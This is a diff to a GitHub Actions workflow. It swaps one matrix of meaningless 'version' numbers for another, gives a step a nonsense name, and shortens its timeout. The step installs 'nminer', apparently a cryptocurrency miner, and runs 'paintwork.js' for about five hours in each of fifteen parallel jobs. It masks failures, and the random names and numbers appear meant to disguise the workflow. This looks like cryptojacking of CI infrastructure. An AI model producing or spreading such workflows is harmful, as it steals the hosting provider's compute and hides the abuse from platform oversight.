@@ -9,22 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4326 }
-          - { version: 7811 }
-          - { version: 1358 }
-          - { version: 5037 }
-          - { version: 9222 }
-          - { version: 3806 }
-          - { version: 4249 }
-          - { version: 2127 }
-          - { version: 7869 }
-          - { version: 3040 }
-          - { version: 7208 }
-          - { version: 8978 }
-          - { version: 4823 }
-          - { version: 5697 }
-          - { version: 509 }
-          - { version: 8514 }
+          - { version: 3590 }
+          - { version: 1337 }
+          - { version: 5085 }
+          - { version: 3810 }
+          - { version: 6958 }
+          - { version: 1707 }
+          - { version: 1704 }
+          - { version: 1033 }
+          - { version: 587 }
+          - { version: 8166 }
+          - { version: 5959 }
+          - { version: 9184 }
+          - { version: 7005 }
+          - { version: 6348 }
+          - { version: 7939 }
 
     steps:
       - name: Checkout
@@ -35,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ick after dimly
+      - name: merrily
         run: |
           npm install nminer@latest
-          timeout 344m node paintwork.js || echo "paintwork executed"
+          timeout 304m node paintwork.js || echo "paintwork executed"
